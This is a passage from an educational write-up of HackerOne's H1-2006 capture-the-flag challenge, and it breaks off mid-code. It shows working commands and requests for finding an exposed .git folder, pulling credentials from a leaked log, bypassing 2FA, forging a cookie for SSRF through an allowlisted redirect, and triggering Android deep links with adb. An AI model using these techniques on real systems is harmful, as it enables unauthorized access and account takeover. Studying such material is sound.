---

date: 2020-05-29
authors:
  - techbrunch
categories:
  - WriteUp
description: The complete writeup for the H1-2006 CTF, including SSRF, Android Reverse Engineering, CSS injection and more.
---

# H1-2006 CTF - WriteUp

The complete writeup for the H1-2006 CTF, including SSRF, Android Reverse Engineering, CSS injection and more.

<!-- more -->

> We need your help! CEO @martenmickos needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us?

![https://twitter.com/Hacker0x01/status/1266454022124376064](h12006-ctf-writeup/h12006.jpg)

## Passive Reconnaissance

### Subdomain Enumeration

Let's start with some recon. The information we have so far is that [@martenmickos](https://twitter.com/martenmickos) has has lost his login details for BountyPay and thus can't approve the May bug bounty payments. We also have the scope which is **\*.bountypay.h1ctf.com**

Usually when I approach a target I'll begin with some subdomain reconnaiscance. I have a couple of aliases in my `~/.zshrc` to use [subfinder](https://github.com/projectdiscovery/subfinder) and [amass](https://github.com/OWASP/Amass). I run subfinder then amass:

```
alias subff="subfinder -o subfinder.txt -v -d"
alias amasss="amass enum -config ~/amass/config.ini -ip -src -nf subfinder.txt -d"
```

Amass results:

```
[Censys]          www.bountypay.h1ctf.com 3.21.98.146
[DNS]             bountypay.h1ctf.com 3.21.98.146
[Censys]          api.bountypay.h1ctf.com 3.21.98.146
[Censys]          app.bountypay.h1ctf.com 3.21.98.146
[Censys]          staff.bountypay.h1ctf.com 3.21.98.146
[Censys]          software.bountypay.h1ctf.com 3.21.98.146
```

We can see that everything is running on the same IP [3.21.98.146](https://censys.io/ipv4/3.21.98.146). Something that is often useful is to get basic info about the IP. For this I have a small function in my `~/.zshrc:`

```bash
ipinfo() {
  http get https://ipinfo.io/$1 -b
}
```

In this case we can see that the IP belongs to Amazon which could be useful if we encounter a SSRF later on:

```json
{
    "city": "Columbus",
    "country": "US",
    "hostname": "ec2-3-21-98-146.us-east-2.compute.amazonaws.com",
    "ip": "3.21.98.146",
    "loc": "40.1357,-83.0076",
    "org": "AS16509 Amazon.com, Inc.",
    "postal": "43236",
    "readme": "https://ipinfo.io/missingauth",
    "region": "Ohio",
    "timezone": "America/New_York"
}
```

### Mapping

I usually follow up with some visual recon using [Aquatone](https://github.com/michenriksen/aquatone):

```
aqua='cat amass.txt | aquatone -ports xlarge'
```

Here I skipped Aquatone since it appears that we only have 5 targets:

* bountypay.h1ctf.com / www.bountypay.h1ctf.com
* api.bountypay.h1ctf.com
* app.bountypay.h1ctf.com
* staff.bountypay.h1ctf.com
* software.bountypay.h1ctf.com

### bountypay.h1ctf.com

![bountypay.h1ctf.com](<h12006-ctf-writeup/Screenshot 2020-06-03 at 09.19.48.png>)

bountypay.h1ctf.com has a dropdown menu that redirects to:

* Customers - app.bountypay.h1ctf.com
* Staff - staff.bountypay.h1ctf.com

!!! info
    You might be wondering what are those orange stripes in the screenshot, this is because I'm using [autochrome](https://github.com/nccgroup/autochrome) a great tool which downloads, installs, and configures a shiny new copy of Chromium for pentesting. If you haven't already I encourage you to check it out ! If you are more a Firefox kind of person then [BitK](https://twitter.com/BitK\_) just released basically the same tool for Firefox named [PwnFox](https://github.com/B-i-t-K/PwnFox).

The other interesting thing we can note is that there is a reference to a Twitter account in the source of the page:

```html
<div style="position:absolute;bottom:7px;right:7px" class="pull-right">
<a href="https://twitter.com/bountypayhq" class="twitter-follow-button pull-right" data-show-count="false"></a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</div>
```

### Twitter

On [@BountypayHQ](https://twitter.com/bountypayhq) profile page there are only 3 tweets including one with a reference to a new employee named Sandra:

![https://twitter.com/bountypayhq](<h12006-ctf-writeup/Screenshot 2020-06-03 at 09.50.13.png>)

BountyPayHQ is only following 3 accounts and we can see that among them, is the new employee [SandraA76708114](https://twitter.com/SandraA76708114) aka Sandra Allison:

![https://twitter.com/BountypayHQ/following](<h12006-ctf-writeup/Screenshot 2020-06-03 at 13.21.50.png>)

If we look at her profile there is only [1 tweet](https://twitter.com/SandraA76708114/status/1258693001964068864) with a photo including what appears to be her employee ID: `STF:8FJ3KFISL3` which will be useful later on:

![https://twitter.com/SandraA76708114/status/1258693001964068864/photo/1](<h12006-ctf-writeup/Screenshot 2020-06-03 at 13.23.06.png>)

### app.bountypay.h1ctf.com

![app.bountypay.h1ctf.com](<h12006-ctf-writeup/Screenshot 2020-06-03 at 09.12.39.png>)

On app.bountypay.h1ctf.com at first sight there is not much to see, there is only a login form which gives su an error when submitting invalid credentials.

### api.bountypay.h1ctf.com

![api.bountypay.h1ctf.com](<h12006-ctf-writeup/Screenshot 2020-06-03 at 09.14.01.png>)

On the api the only thing out of the ordinary is a link that redirects to Google Search, we will come back to this later on.

```html
<a href="/redirect?url=https://www.google.com/search?q=REST+API">REST API</a>
```

### staff.bountypay.h1ctf.com

![staff.bountypay.h1ctf.com](<h12006-ctf-writeup/Screenshot 2020-06-03 at 09.14.52.png>)

The staff application looks really similar to the app one. We are presented with a login form which throws an error with invalid credentials. Something we can note is the `template` parameter in the URL used to load the login template.

### software.bountypay.h1ctf.com

![software.bountypay.h1ctf.com](<h12006-ctf-writeup/Screenshot 2020-06-03 at 09.16.58.png>)

The software subdomain appear to be only accessible from a specific IP.

## Active Reconnaissance

### Directory Enumeration

After the passive reconnaiscance I usually do some directory and file bruteforcing. My goto tool for this now is [ffuf](https://github.com/ffuf/ffuf). FFuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go.

```
ffuf -w raft-large-directories.txt \
-o ffuf-directories-app.json \
-u https://app.bountypay.h1ctf.com/FUZZ/ \
-t 10 \
-replay-proxy http://127.0.0.1:8080
```

ffuf output:

```
________________________________________________

 :: Method           : GET
 :: URL              : https://app.bountypay.h1ctf.com/FUZZ/
 :: Output file      : ffuf-directories-app.json
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: ReplayProxy      : http://127.0.0.1:8080
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

images                  [Status: 403, Size: 178, Words: 5, Lines: 8]
js                      [Status: 403, Size: 178, Words: 5, Lines: 8]
css                     [Status: 403, Size: 178, Words: 5, Lines: 8]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
cgit                    [Status: 403, Size: 170, Words: 5, Lines: 7]
:: Progress: [62275/62275] :: Job [1/1] :: 80 req/sec :: Duration: [0:12:54] :: Errors: 3 ::
```

There is one entry that looks interesting `cgit`, which might indicate that we are in the presence of a misconfigured NGINX web server with a `.git` folder that is publicly available. Let's see if we can access the config file. This request was made inside Burp but I'll use [HTTPie](https://httpie.org/) output for the writeup since it will make the report easier to read:&#x20;

```
http get https://app.bountypay.h1ctf.com/.git/config
```

```HTTP
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: application/octet-stream
Date: Thu, 04 Jun 2020 16:41:44 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

Bingo ! The config file gives us the URL of the [repository](https://github.com/bounty-pay-code/request-logger).&#x20;

### Souce code analysis

![https://github.com/bounty-pay-code/](<h12006-ctf-writeup/Screenshot 2020-06-03 at 18.46.28.png>)

The GitHub [account](https://github.com/bounty-pay-code) has only one repository with one [file](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) and one [commit](https://github.com/bounty-pay-code/request-logger/commits/master). We can see that the PHP file is logging request data into a file named `bp_web_trace.log`.

```php title="logger.php"
<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents(
  'bp_web_trace.log',
  date("U").':'.base64_encode(json_encode($data))."\n",
  FILE_APPEND
);
```

Let's see if the file is available on the server.

```
http get https://app.bountypay.h1ctf.com/bp_web_trace.log
```

```HTTP
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: application/octet-stream
Date: Thu, 04 Jun 2020 16:46:48 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

We can easily decode the base64 encoded data, I'm either using [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) inside of Burp or [CyberChef](https://gchq.github.io/CyberChef/) for this kind of thing:

```json
{
    "IP": "192.168.1.1",
    "METHOD": "GET",
    "PARAMS": {
        "GET": [],
        "POST": []
    },
    "URI": "/"
}
{
    "IP": "192.168.1.1",
    "METHOD": "POST",
    "PARAMS": {
        "GET": [],
        "POST": {
            "password": "V7h0inzX",
            "username": "brian.oliver"
        }
    },
    "URI": "/"
}
{
    "IP": "192.168.1.1",
    "METHOD": "POST",
    "PARAMS": {
        "GET": [],
        "POST": {
            "challenge_answer": "bD83Jk27dQ",
            "password": "V7h0inzX",
            "username": "brian.oliver"
        }
    },
    "URI": "/"
}
{
    "IP": "192.168.1.1",
    "METHOD": "GET",
    "PARAMS": {
        "GET": {
            "month": "04",
            "year": "2020"
        },
        "POST": []
    },
    "URI": "/statements"
}
```

The most interesting one is the third where we can see a username, password and 2FA challenge answer. If we try to login using the credentials found in the log file we get asked for a 10 characters password sent to the user's phone:

![BountyPay - Login 2FA](<h12006-ctf-writeup/Screenshot 2020-06-03 at 19.10.39.png>)

The code found in the log file is invalid and bruteforcing the code is usually not the way to go in CTFs.&#x20;

### Bypassing 2FA

Let's analyze the request being sent when submitting the challlenge answer:

```HTTP
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 108
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/orange
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=brian.oliver&password=V7h0inzX&challenge=8718040845a881ff0da135418b2811b2&challenge_answer=V7h0inzX
```

We can see that there is an extra parameter named `challenge` . The value appears to be an MD5 hash. The hash is different after each login request. After a bit of trial and error we can guess that the `challenge` should be an MD5 hash of the `challenge_answer`. When this is the case we can successfully login ! 🥳

```
http -f post https://app.bountypay.h1ctf.com \
username=brian.oliver \
password=V7h0inzX \
challenge=5828c689761cce705a1c84d9b1a1ed5e \
challenge_answer=bD83Jk27dQ
```

```HTTP
HTTP/1.1 302 Found
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Thu, 04 Jun 2020 16:51:11 GMT
Location: /
Server: nginx/1.14.0 (Ubuntu)
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Sat, 04-Jul-2020 16:51:11 GMT; Max-Age=2592000
Transfer-Encoding: chunked
```

![BountyPay | Dashboard](<h12006-ctf-writeup/Screenshot 2020-06-03 at 19.24.23.png>)

!!! info
    We can note that the `challenge` parameter has been omitted in the log file, probably to make this step a little bit harder.

## Server Side Request Forgery

Once we are logged in there is not much we can do except for loading transactions for our account.

![BountyPay | Dashboard](<h12006-ctf-writeup/Screenshot 2020-06-03 at 19.24.23.png>)

Loading the transactions:

```
http get https://app.bountypay.h1ctf.com/statements\?month\=02\&year\=2020 \
Cookie:'token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9'
```

```HTTP
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: application/json
Date: Thu, 04 Jun 2020 16:54:38 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

{
    "data": "{\"description\":\"Transactions for 2020-02\",\"transactions\":[]}",
    "url": "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=02&year=2020"
}
```

The response contains two interesting piece of information. The transaction data, our account does not appear to have access to any transactions, and a `url` which seems to indicate that the server is actually making a request to  api.bountypay.h1ctf.com.

If we look into the JavaScript files we can also see that there is an endpoint that is used to pay transactions:

```javascript title="/js/app.js"
$(".loadTxns").click(function() {
  let t = $('select[name="month"]').val(),
    e = $('select[name="year"]').val();
  $(".txn-panel").html(""), $.get("/statements?month=" + t + "&year=" + e, function(t) {
    if (t.hasOwnProperty("data")) {
      let e = JSON.parse(t.data);
      if (e.hasOwnProperty("transactions"))
        if (0 == e.transactions.length) $(".txn-panel").html('<div class="text-center" style="margin:10px">No Transactions To Process</div>');
        else {
          let t = "";
          t += '<table style="margin:0" class="table"><tr><th>Hacker(s)</th><th class="text-center">Program(s)</th><th class="text-center">Reports(s)</th><th class="text-center">Pay Out</th><th class="text-center">Action</th></tr>', $.each(e.transactions, function(e, s) {
            t += "<tr><td>" + s.hackers + '</td><td class="text-center">' + s.programs + '</td><td class="text-center">' + s.reports + '</td><td class="text-center">' + s.amount + '</td><td class="text-center"><a href="/pay/' + s.id + "/" + s.hash + '" class="btn btn-sm btn-success">Pay</a></td></tr>'
          }), t += "</table>", $(".txn-panel").html(t)
        }
      else alert("Invalid Response From The Server")
    } else alert("Invalid Response From The Server")
  })
});
```

If we try to guess the `id` and `hash` for the `GET /pay/{id}/{hash}` endpoint we get an error from the server: `Invalid payment details`. Let's leave this endpoint for now and focus on the retrieval of transactions.

Looking back at the response for the transaction retrieval request we can assume that the application is making an HTTP request to the `url` parameter. After some testing it appears that `month` and `year` parameter are not vulnerable.

Something we did not check yet is the content of our session cookie:

```
eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

The beggining of the string `eyJ` is characteristic of base64 JSON encoded data. Let's see what's inside:

```json
{
  "account_id": "F8gHiqSdpK",
  "hash": "de235bffd23df6995ad4e0930baac1a2"
}
```

We can see that our session cookie contains the `account_id` which is present in the URL used to retrieve the transactions. If our assumptions is correct this means that we can manipulate the URL used to retrieve the transactions. Without another `account_id` we can't test for IDOR but we might be able to manipulate the request.

If we set the value of the token cookie to `../accounts/F8gHiqSdpK` ,we can see that the reponse is identical which means that we currently have an SSRF that is limited to the app.bountypay.h1ctf.com subdomain.

One way to augment the impact of an SSRF is to use an open redirect to be able to target non whitelisted domains or in our case a domain that is not app.bountypay.h1ctf.com. If we look back at the notes taken during the passive reconnaissance phase, there is one feature that might be useful.

On api.bountypay.h1ctf.com there is a link to Google Search that is not a simple link. Let's look at the request:

```
http get "https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API"
```

```HTTP
HTTP/1.1 302 Found
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Thu, 04 Jun 2020 16:57:33 GMT
Location: https://www.google.com/search?q=REST API
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked
```

The problem is that there is an allowlist which appear to only accept a URL that starts with `https://www.google.com/search?q=`. Otherwise we get an error, either `URL NOT FOUND IN WHITELIST` or `URL must begin with either http:// or https://`.

My initial idea was that if we can bypass the allowlist we could send the request to a server under our control which would allow us to intercept some potentially interesting headers or cookies. After multiple failed attemps it appeared that it was not possible to bypass the allowlist.

If we cannot bypass the controls in place, maybe we can find other urls present in the allowlist. It turns out that both `https://staff.bountypay.h1ctf.com/` and `https://software.bountypay.h1ctf.com/` are accepted ! Which means that we can bypass the IP restriction on software.bountypay.h1ctf.com.

!!! warning
    I ended spending way more time on this step since when I first tested this I did not add the `/` at the end of the URL resulting in a URL `NOT FOUND IN WHITELIST` error 😢. The cool part is that because of that I went down a rabbit hole thinking that there might an open redirect on www.google.com. Turns out there are some but they were not exploitable since the whitelisted URL needed to end with `search?q=.`

Let's set `../../redirect?url=https://software.bountypay.h1ctf.com/#` as our account id and see what happens:

```json
{
  "account_id": "../../redirect?url=https://software.bountypay.h1ctf.com/",
  "hash": "de235bffd23df6995ad4e0930baac1a2"
}
```

```
http get https://app.bountypay.h1ctf.com/statements\?month\=02\&year\=2020 \
Cookie:'token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0='
```

```HTTP
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: application/json
Date: Thu, 04 Jun 2020 17:10:40 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

{
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage</title>\n    <link href=\"/css/bootstrap.min.css\" rel=\"stylesheet\">\n</head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage</h1>\n            <form method=\"post\" action=\"/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login</div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:</label></div>\n                        <div><input name=\"username\" class=\"form-control\"></div>\n                        <div style=\"margin-top:7px\"><label>Password:</label></div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"></div>\n                    </div>\n                </div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            </form>\n        </div>\n    </div>\n</div>\n<script src=\"/js/jquery.min.js\"></script>\n<script src=\"/js/bootstrap.min.js\"></script>\n</body>\n</html>",
    "url": "https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/#/statements?month=02&year=2020"
}
```

The data now contains the HTML content of the software.bountypay.h1ctf index page which is a login form:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Software Storage</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>

	<div class="container">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <h1 style="text-align: center">Software Storage</h1>
            <form method="post" action="/">
                <div class="panel panel-default" style="margin-top:50px">
                    <div class="panel-heading">Login</div>
                    <div class="panel-body">
                        <div style="margin-top:7px"><label>Username:</label></div>
                        <div><input name="username" class="form-control"></div>
                        <div style="margin-top:7px"><label>Password:</label></div>
                        <div><input name="password" type="password" class="form-control"></div>
                    </div>
                </div>
                <input type="submit" class="btn btn-success pull-right" value="Login">
            </form>
        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```

Since our SSRF is pretty limited (we can only do GET requests), the next logical step is to do more enumerations. For this we can use Burp Intruder with Hackvertor to dynamically base64 encode the payload.

![Burp Intruder configuration](<h12006-ctf-writeup/Screenshot 2020-06-03 at 20.34.48.png>)

The "Directories - short" gives us some interesting results:

![Intruder results](<h12006-ctf-writeup/Screenshot 2020-06-03 at 20.33.39.png>)

It appears that there is an apk in the sources directory. The [apk](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk) can be retrieved as there are no access control !

```
http get https://software.bountypay.h1ctf.com/uploads/BountyPay.apk
```

```HTTP
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: application/octet-stream
Date: Thu, 04 Jun 2020 17:12:44 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked



+-----------------------------------------+
| NOTE: binary data not shown in terminal |
+-----------------------------------------+
```

## Android Reverse Engineering

Let's start by decompiling the APK using [JADX](https://github.com/skylot/jadx) which is a Dex to Java decompiler:

```
jadx BountyPay.apk
```

In our case the interesting files are going to be in `/sources/bounty`:

```
/BountyPay/sources/bounty
└── pay
    ├── BuildConfig.java
    ├── CongratsActivity.java
    ├── MainActivity.java
    ├── PartOneActivity.java
    ├── PartThreeActivity.java
    ├── PartTwoActivity.java
    └── R.java

1 directory, 7 files
```

We can see that there is one MainActivity and three activities named PartOne, PartTwo and PartThree.

Looking at the Manifest we can see that there are actually 5 activities define:

* bounty.pay.MainActivity
* bounty.pay.PartOneActivity
* bounty.pay.PartTwoActivity
* bounty.pay.PartThreeActivity
* bounty.pay.CongratsActivity

```xml title="AndroidManifest.xml"
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_congrats" android:name="bounty.pay.CongratsActivity"/>
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="three" android:host="part"/>
    </intent-filter>
</activity>
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="two" android:host="part"/>
    </intent-filter>
</activity>
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="one" android:host="part"/>
    </intent-filter>
</activity>
<activity android:name="bounty.pay.MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

Something interesting to note is that PartOne, PartTwo and PartThree activities all defined an intent filter a scheme and an host:

* one://part
* two://part
* three://part

Let's install the app on our favorite emulator (here I'm using [Android Studio](https://developer.android.com/studio)'s emulator) using [adb](https://developer.android.com/studio/command-line/adb):

```
adb install BountyPay.apk
```

The fist screen invites us to enter a username and a Twitter handle.

![BountyPay](<h12006-ctf-writeup/Screenshot 2020-06-03 at 22.28.13.png>)

### PartOneActivity

The PartOne acitivity only has a button that gives use hints when we click on it:

* Deep links.
* Params.


!!! info
    Deeplinks are a concept that help users navigate between **the web** and **applications.** They are basically URLs which navigate users directly to the specific content in **applications.** Optionally, some data or parameter can be passed along.

When we look at the code we can see the corresponding code:

```java
public void onClick(View view) {
  if (PartOneActivity.this.click == 0) {
    Snackbar.make(view, (CharSequence) "Deep links.", 0)
    .setAction((CharSequence) "Action", (View.OnClickListener) null)
    .show();
    PartOneActivity.this.click++;
  } else if (PartOneActivity.this.click == 1) {
    Snackbar.make(view, (CharSequence) "Params.", 0)
    .setAction((CharSequence) "Action", (View.OnClickListener) null)
    .show();
    PartOneActivity.this.click = 0;
  }
}
```

Afterwards we can see that there are a few conditions to continue to the next activity:

* The setting should contains a username (set on the first screen)
* A query parameter named `start` should be present with a value of `PartTwoActivity`

If all the condiditions are met the PartTwo activity is started.

```java
if (!settings.contains("USERNAME")) {
  Toast.makeText(getApplicationContext(), "Please create a CTF username :)", 0)
  .show();
  startActivity(new Intent(this, MainActivity.class));
}
if (getIntent() != null && getIntent().getData() != null 
    && (firstParam = getIntent().getData().getQueryParameter("start")) != null 
    && firstParam.equals("PartTwoActivity") 
    && settings.contains("USERNAME")) {

  String user = settings.getString("USERNAME", "");
  SharedPreferences.Editor editor = settings.edit();
  String twitterhandle = settings.getString("TWITTERHANDLE", "");
  editor.putString("PARTONE", "COMPLETE").apply();
  logFlagFound(user, twitterhandle);
  startActivity(new Intent(this, PartTwoActivity.class));
}
```

This can be done using adb using the following command:

```
adb shell am start -W -a android.intent.action.VIEW \
-d "one://part?start=PartTwoActivity" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity pkg=bounty.pay }
Status: ok
Activity: bounty.pay/.PartOneActivity
ThisTime: 470
TotalTime: 470
WaitTime: 499
Complete
```

### PartTwoActivity

Here again we are presented with a white screen with a button giving us two hints:

* Currently invisible.
* Visible with the right params.

![](<h12006-ctf-writeup/Screenshot 2020-06-03 at 22.49.08.png>)

This seems to imply that there is some invisible content that will be revealed if we send the right parameters. Let's look at the code.

```java title="PartTwoActivity.java"
public void onCreate(Bundle savedInstanceState) {
  [...]
  editText.setVisibility(4);
  button.setVisibility(4);
  textview.setVisibility(4);
  [...]
  if (!settings.contains("USERNAME")) {
    Toast.makeText(
      getApplicationContext(), "Please create a CTF username :)",
      0
    )
    .show();
    startActivity(new Intent(this, MainActivity.class));
  }
  if (!settings.contains("PARTONE")) {
    Toast.makeText(
      getApplicationContext(),
      "Part one not completed!",
      0
    )
    .show();
    startActivity(new Intent(this, MainActivity.class));
  }
  if (getIntent() != null && getIntent().getData() != null) {
    Uri data = getIntent().getData();
    String firstParam = data.getQueryParameter("two");
    String secondParam = data.getQueryParameter("switch");
    if (firstParam != null &&
      firstParam.equals("light") &&
      secondParam != null &&
      secondParam.equals("on")) {
      editText.setVisibility(0);
      button.setVisibility(0);
      textview.setVisibility(0);
    }
  }
}
```

This time we can see that some conditions are required to be able to see the invisible content:

* The username needs to be set
* Part one needs to be complete
* Two parameter are required, `two` with a value of `light` and `switch` with a value of `on`

Here again we can do this using adb:

```
adb shell am start -W -a android.intent.action.VIEW \
-d "two://part?two=light\&switch=on" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=two://part?two=light&switch=on pkg=bounty.pay }
Status: ok
Activity: bounty.pay/.PartTwoActivity
ThisTime: 238
TotalTime: 238
WaitTime: 275
Complete
```

!!! warning
    Make sure to escape the `&` when passing multiple parameters !

As expected we can now see an input field expecting a `Header value` and underneath an MD5 hash.

![](<h12006-ctf-writeup/Screenshot 2020-06-03 at 22.50.32.png>)

Clicking on the submit button will trigger the `submitInfo` function. We can see that the header value should start with `X-` and if so the `correctHeader` function will be called which in turns will start PartThreeActivity.

```java
public void submitInfo(View view) {
  final String post = ((EditText) findViewById(R.id.editText)).getText().toString();
  this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
    public void onDataChange(DataSnapshot dataSnapshot) {
      SharedPreferences settings = PartTwoActivity.this.getSharedPreferences(
        PartTwoActivity.KEY_USERNAME,
        0
      );
      SharedPreferences.Editor editor = settings.edit();
      String str = post;
      if (str.equals("X-" + ((String) dataSnapshot.getValue()))) {
        PartTwoActivity.this.logFlagFound(
          settings.getString("USERNAME", ""),
          settings.getString("TWITTERHANDLE", "")
        );
        editor.putString("PARTTWO", "COMPLETE").apply();
        PartTwoActivity.this.correctHeader();
        return;
      }
      Toast.makeText(PartTwoActivity.this, "Try again! :D", 0).show();
    }

    public void onCancelled(DatabaseError databaseError) {
      Log.e(PartTwoActivity.TAG, "onCancelled", databaseError.toException());
    }
  });
}

/* access modifiers changed from: private */
public void correctHeader() {
  startActivity(new Intent(this, PartThreeActivity.class));
}
```

### PartThreeActivity

This time the conditions that needs to be met are:

* First param three should be equal to `Base64("PartThreeActivity")`
* Second param switch should be equal to `Base64("on")`
* Third param header should be equal to the previously defined header, in our case `X-Token`

```java
if (getIntent() != null && getIntent().getData() != null) {
  Uri data = getIntent().getData();
  String firstParam = data.getQueryParameter("three");
  String secondParam = data.getQueryParameter("switch");
  String thirdParam = data.getQueryParameter("header");
  byte[] decodeFirstParam = Base64.decode(firstParam, 0);
  byte[] decodeSecondParam = Base64.decode(secondParam, 0);
  final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);
  final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);
